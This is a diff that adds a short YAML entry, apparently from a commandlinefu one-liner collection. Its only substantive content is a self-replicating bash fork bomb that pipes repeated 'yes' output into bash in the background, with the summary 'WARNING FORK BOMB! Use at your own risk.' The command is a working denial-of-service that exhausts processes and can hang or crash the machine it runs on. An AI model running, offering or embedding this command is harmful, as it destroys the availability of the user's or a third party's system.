@@ -1,0 +1,8 @@
+commandlinefu_id: 1425
+translator:
+  weibo: ''
+hide: true
+command: |-
+  b=\' c=\\ a='yes $( echo b=$c$b c=$c$c a=$b$a$b; echo $a ) | bash &'; yes $( echo b=$c$b c=$c$c a=$b$a$b; echo $a ) | bash &
+summary: |-
+  WARNING FORK BOMB! Use at your own risk.
